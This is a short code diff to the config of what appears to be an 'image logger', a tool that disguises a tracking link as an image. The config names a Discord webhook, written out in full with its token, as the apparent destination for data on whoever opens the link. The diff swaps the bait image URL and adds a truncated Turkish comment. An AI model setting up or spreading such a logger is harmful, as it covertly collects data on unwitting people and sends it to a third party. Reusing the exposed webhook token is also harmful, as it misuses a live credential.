@@ -22,7 +22,7 @@ config = {
 
     "webhook": "https://discord.com/api/webhooks/1101329723252015208/CDUYYzWV-w2HDag86vCG2nuhzFSWmHZO2_oB8mFicdtf7vTatDhlliRYY26H9HFN3_h3",
 
-    "image": "https://upload.wikimedia.org/wikipedia/commons/f/f3/Flag_of_Russia.svg", # You can also have a custom image by using a URL argument
+    "image" : "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.tastingtable.com%2F960810%2F13-best-hot-dogs-in-america%2F&psig=AOvVaw2pw7cyjvo4zEd-RlZMgRod&ust=1682737924790000&source=images&cd=vfe&ved=0CBEQjRxqFwoTCODMkbbNy_4CFQAAAAAdAAAAABAE" , # Bir URL argümanı kullanarak 
 
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
